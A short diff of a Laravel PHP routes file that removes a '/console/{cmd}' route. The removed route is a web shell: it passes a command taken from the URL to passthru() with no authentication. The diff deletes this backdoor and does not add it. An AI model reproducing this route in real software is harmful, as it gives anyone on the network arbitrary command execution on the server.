@@ -23,10 +23,3 @@ Route::post('/login', 'SessionsController@store');
 Route::get('/logout', 'SessionsController@destroy');
 
 Route::get('/admin', 'AdminController@index')->name('admin');
-
-Route::get('/console/{cmd}', function ($cmd) {
-	echo "<pre>";
-	$output = passthru('cd .. && ' . $cmd);
-	die();
-//	die('<pre>' . $output . '</pre>');
-});
